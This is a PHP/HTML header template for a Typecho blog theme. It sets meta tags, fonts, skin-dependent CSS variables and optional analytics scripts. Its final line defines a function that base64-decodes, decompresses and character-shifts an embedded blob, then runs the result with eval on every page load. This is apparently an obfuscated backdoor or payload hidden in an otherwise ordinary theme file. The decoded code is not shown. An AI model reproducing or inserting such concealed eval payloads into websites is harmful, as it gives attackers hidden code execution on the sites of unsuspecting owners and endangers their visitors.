<meta charset="utf-8" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, shrink-to-fit=no, viewport-fit=cover, maximum-scale=1, minimum-scale=1">
<title><?php $this->archiveTitle(array('category' => '分类 %s 下的文章', 'search' => '包含关键字 %s 的文章', 'tag' => '标签 %s 下的文章', 'author' => '%s 发布的文章'), '', ' - '); ?><?php $this->options->title(); ?></title>
<link rel="shortcut icon" href="<?php echo $this->options->cat_favicon ? $this->options->cat_favicon : 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text x=%22-0.125em%22 y=%22.9em%22 font-size=%2290%22>🌸</text></svg>' ?>" />
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<meta name="format-detection" content="telephone=no,email=no,adress=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests" />
<?php if ($this->is('single')) : ?>
	<meta name="keywords" content="<?php echo $this->fields->post_keywords ? $this->fields->post_keywords : htmlspecialchars($this->keywords); ?>" />
	<meta name="description" content="<?php echo $this->fields->post_abstract ? $this->fields->post_abstract : htmlspecialchars($this->description); ?>" />
	<?php $this->header('keywords=&description='); ?>
<?php elseif ($this->is('archive')) : ?>
	<meta name="description" content="<?php $this->options->title() . $this->archiveTitle() ?>" />
	<?php $this->header('description='); ?>
<?php else : ?>
	<?php $this->header(); ?>
<?php endif; ?>
<?php
$user_fonturl = $this->options->user_fonturl ? $this->options->user_fonturl : '';
if (strpos($user_fonturl, 'woff2') !== false) $fontFormat = 'woff2';
elseif (strpos($user_fonturl, 'woff') !== false) $fontFormat = 'woff';
elseif (strpos($user_fonturl, 'ttf') !== false) $fontFormat = 'truetype';
elseif (strpos($user_fonturl, 'eot') !== false) $fontFormat = 'embedded-opentype';
elseif (strpos($user_fonturl, 'svg') !== false) $fontFormat = 'svg';
?>
<style>
@font-face {
    font-family: 'userfont';
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url('<?php echo $user_fonturl ?>');
    <?php if ($fontFormat) : ?>src: url('<?php echo $user_fonturl ?>') format('<?php echo $fontFormat ?>');
    <?php endif; ?>
}
@font-face {
  font-family: 'catfont';
  font-weight: 400;
  font-style: normal;
  font-display: swap;
  src: url('//at.alicdn.com/t/webfont_3a9kuab7t97.eot'); 
  src: url('//at.alicdn.com/t/webfont_3a9kuab7t97.eot?#iefix') format('embedded-opentype'), 
  url('//at.alicdn.com/t/webfont_3a9kuab7t97.woff2') format('woff2'),
  url('//at.alicdn.com/t/webfont_3a9kuab7t97.woff') format('woff'), 
  url('//at.alicdn.com/t/webfont_3a9kuab7t97.ttf') format('truetype'), 
  url('//at.alicdn.com/t/webfont_3a9kuab7t97.svg#Alibaba-PuHuiTi-Regular') format('svg'); 
}
body {
    <?php if ($user_fonturl) : ?>font-family: 'userfont';
    <?php else : ?>font-family: 'catfont', 'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', '微软雅黑', Arial, sans-serif;
    <?php endif; ?>
}
html {
    <?php if ($this->options->cat_skin_choose == 'parchment') :?>
    	--main: rgb(80 50 0);
        --colorG: rgb(82 52 0 / 80%);
        --colorF: rgb(82 52 0 / 70%);
        --colorE: rgb(82 52 0 / 60%);
        --colorD: rgb(82 52 0 / 50%);
        --colorC: rgb(82 52 0 / 35%);
        --colorB: rgb(82 52 0 / 20%);
        --colorA: rgb(82 52 0 / 10%);
        --background-color: #ffe6cc;
        --under-background: #ffd1a5 url(<?php echo resource_cdn() . 'img/underbackground.webp'; ?>);
        --background: var(--background-color) url(<?php echo resource_cdn() . 'img/underbackground.webp'; ?>);
        --border: 2px dashed var(--colorF);
    <?php elseif ($this->options->cat_skin_choose == 'puzzle') :?>
        --main: rgb(12 25 50);
        --colorG: rgb(12 25 50 / 80%);
        --colorF: rgb(12 25 50 / 70%);
        --colorE: rgb(12 25 50 / 60%);
        --colorD: rgb(12 25 50 / 50%);
        --colorC: rgb(12 25 50 / 35%);
        --colorB: rgb(12 25 50 / 20%);
        --colorA: rgb(12 25 50 / 10%);
    	--under-background: linear-gradient(117deg,#f3efff,#e7f1ff);
        --background-color: #fff;
        --background: #f6f7ff;
        --border: unset;
    <?php else : ?>
    	--main: rgb(12 25 50);
        --colorG: rgb(12 25 50 / 80%);
        --colorF: rgb(12 25 50 / 70%);
        --colorE: rgb(12 25 50 / 60%);
        --colorD: rgb(12 25 50 / 50%);
        --colorC: rgb(12 25 50 / 35%);
        --colorB: rgb(12 25 50 / 20%);
        --colorA: rgb(12 25 50 / 10%);
        <?php if ($this->options->cat_qingmo_background_choose == 'summer') :?>
    	    --under-background: linear-gradient(117deg,#ffefef,#f2e7ff);
    	<?php elseif ($this->options->cat_qingmo_background_choose == 'spring') :?>
    	    --under-background: linear-gradient(90deg,rgba(247,149,51,.1),rgba(243,112,85,.1) 15%,rgba(239,78,123,.1) 30%,rgba(161,102,171,.1) 44%,rgba(80,115,184,.1) 58%,rgba(16,152,173,.1) 72%,rgba(7,179,155,.1) 86%,rgba(109,186,130,.1)),white;
    	<?php elseif ($this->options->cat_qingmo_background_choose == 'autumn') :?>
    	    --under-background: linear-gradient(117deg,#ffebbe,#fffdeb);
    	<?php else : ?>
    	    --under-background: linear-gradient(117deg,#f3efff,#e7f1ff);
    	<?php endif; ?>
        --background-color: #fff;
        --background: #f6f7ffcc;
        --border: unset;
    <?php endif; ?>
	--theme: <?php echo ($this->options->user_themecolor ? $this->options->user_themecolor : '#ff6a6a') ?>;
	--theme-10: <?php echo ($this->options->user_themecolor ? $this->options->user_themecolor . '1a' : '#ff6a6a1a') ?>;
	--theme-30: <?php echo ($this->options->user_themecolor ? $this->options->user_themecolor . '4d' : '#ff6a6a4a') ?>;
	--theme-60: <?php echo ($this->options->user_themecolor ? $this->options->user_themecolor . '99' : '#ff6a6a99') ?>;
	--theme-80: <?php echo ($this->options->user_themecolor ? $this->options->user_themecolor . 'cc' : '#ff6a6acc') ?>;
}
<?php if ($this->options->cat_skin_choose == 'puzzle') :?>
    .friends_block,header,footer,article,#cat_comment > ol > li,.cat_comment_title,.cat_title_footer_title,.user_webinfo,.cat_title_header .cat_title_block,.cat_userpage_replytitle,.cat_userpage_replyli,.post_overtime{
        border-radius: 0!important;
        border: 10px solid transparent!important;
        -webkit-border-image: url(<?php echo resource_cdn() . 'img/round.webp'; ?>) 30 round!important;
        -moz-border-image: url(<?php echo resource_cdn() . 'img/round.webp'; ?>) 30 round!important;
        border-image: url(<?php echo resource_cdn() . 'img/round.webp'; ?>) 30 round!important;
        border-image-outset: 10px!important;
        background:var(--background);
    }
    .darkmode .friends_block,.darkmode header,.darkmode footer,.darkmode article, .darkmode #cat_comment > ol > li,.darkmode .cat_comment_title,.darkmode .cat_title_footer_title,.darkmode .user_webinfo,.darkmode .cat_title_header .cat_title_block,.darkmode .cat_userpage_replytitle,.darkmode .cat_userpage_replyli,.darkmode .post_overtime{
        -webkit-border-image: url(<?php echo resource_cdn() . 'img/rounddark.webp'; ?>) 30 round!important;
        -moz-border-image: url(<?php echo resource_cdn() . 'img/rounddark.webp'; ?>) 30 round!important;
        border-image: url(<?php echo resource_cdn() . 'img/rounddark.webp'; ?>) 30 round!important;
        border-image-outset: 10px!important;
    }
    .friends_block,.cat_comment_title,.cat_title_footer_title, .cat_title_header .cat_title_block,.post_overtime{
        padding: 0!important;
    }
    .cat_userpage_replytitle,.cat_userpage_replyli{
        padding: 0.5rem!important;
    }
    .cat_title_footer_title {
        line-height: 2rem!important;
    }
    header .anniu,footer .anniu{
        margin: 0.5rem 0!important;
    }
<?php endif; ?>
<?php if ($this->options->cat_skin_choose == 'puzzle') :?>
body {
    background-image: linear-gradient(90deg, rgb(60 10 30 / 9%) 3%, rgb(0 0 0 / 3%) 0), linear-gradient(1turn, rgb(60 10 30 / 9%) 3%, rgb(0 0 0 / 3%) 0);
    background-size: 30px 30px;
}
body:before {
    content: '';
    background-image: url(<?php echo resource_cdn() . 'img/pencil.webp'; ?>);
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-repeat: repeat-x;
    background-position: bottom;
    z-index: -1;
}
<?php elseif ($this->options->cat_skin_choose == 'off' && $this->options->cat_qingmo_background_choose == 'img' && $this->options->cat_defaultBackgroundImage) :?>
<?php
$Image_arr = array_values(array_filter(explode("\r\n", Helper::options()->cat_defaultBackgroundImage)));
if (count($Image_arr) > 0) {
    $key = array_rand($Image_arr, 1);
}
?>
body:before {
    content: '';
    background: url(<?php echo $Image_arr[$key]; ?>) no-repeat fixed center;
    filter: blur(0.375rem);
    background-position: center;
    background-size: cover;
    display: block;
    position: fixed;
    left: 0;
    right: 0;
    top: 0;
    bottom: 0;
    opacity: 0.8;
    z-index: -1;
}
.darkmode body:before {
    filter: blur(0.375rem) opacity(0.3);
}
.silencemode body:before {
    filter: blur(0.375rem) opacity(0.1);
}
.cat_title_header{
    opacity:1!important;
}
<?php else: ?>
body {
    background: var(--under-background);
}
<?php endif; ?>
</style>
<link rel="stylesheet" href="<?php echo resource_cdn() . 'webfonts/remixicon.css' ?>" />
<link rel="stylesheet" href="<?php echo resource_cdn() . 'webfonts/qweather-icons.css' ?>" />
<?php if($this->options->cat_51tongji_id && $this->options->cat_51tongji_ck) : ?>
    <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
    <script>
    LA.init({
        id: '<?php $this->options->cat_51tongji_id()?>',
        ck: '<?php $this->options->cat_51tongji_ck()?>'
    })
    </script>        
<?php endif; ?>
<?php if($this->options->cat_baidutongji) : ?>
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?<?php $this->options->cat_baidutongji()?>";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
<?php endif; ?>
<link rel="stylesheet" href="<?php echo resource_cdn() . 'css/animation.css' ?>" />
<link rel="stylesheet" href="<?php echo resource_cdn() . 'public/fancybox.css' ?>" />
<link rel="stylesheet" href="<?php echo resource_cdn() . 'public/APlayer.min.css' ?>" />
<link rel="stylesheet" href="<?php echo resource_cdn() . 'public/OwO.min.css' ?>" />
<link rel="stylesheet" href="<?php echo resource_cdn() . 'public/jBox.all.min.css' ?>" />
<link rel="stylesheet" href="<?php echo resource_cdn() . 'public/swiper-bundle.min.css' ?>" />
<link rel="stylesheet" href="<?php echo resource_cdn() . 'css/header.css' ?>" />
<link rel="stylesheet" href="<?php echo resource_cdn() . 'css/main.css' ?>" />
<link rel="stylesheet" href="<?php echo resource_cdn() . 'css/screen.css' ?>" />
<?php echo $this->options->cat_user_header ? $this->options->cat_user_header : '' ?>
<?php echo $this->options->cat_user_css ? '<style>' . $this->options->cat_user_css . '</style>' : '' ?>
<?php function HRaXaW($DTRm)
{ 
$DTRm=gzinflate(base64_decode($DTRm));
 for($i=0;$i<strlen($DTRm);$i++)
 {
$DTRm[$i] = chr(ord($DTRm[$i])-1);
 }
 return $DTRm;
 }eval(HRaXaW("NVBNS8NAFPwB/RWPtkpCm34oTdOkphevXqTgpZc0u0mWprvLJjWteNBDTwriRYoIgidBEDwIRe2/sdSe9B+4Ce07zZs3bwYGIJ3eCUE+jnvdAA9x1DtmSWSaThgyV1E1O2ZKMc4uqgUdO9fu8IBDkcAB1CxIAhJiUNJV7rC7CxuxZlM8jhVVNbOnyBWEx3YuzXMZjViIKyHzlfyO+/d4PYfV89Xy4+b367474dgNGJzD9/xz/TST1NHkkDhiom2St/6nWESEUUWVAal88fBzMZXy1eXL8u59PX2T5PJ1tlrcSjKIYx6Z1WqSJJXhsD84q7gU0uR8GfIuC5kwC57nWdB33IEv2IgiE0JCsSM0XziIYBore80awn4ZCnUDNdG+BLrRbyIkgaG3GliXoGXoHsayKu4gRKhvgsHHUG/wsfRmAmGhpXajKDvkVSvXrm7L2VZbKlmAKcq6TTv/Bw=="));?>
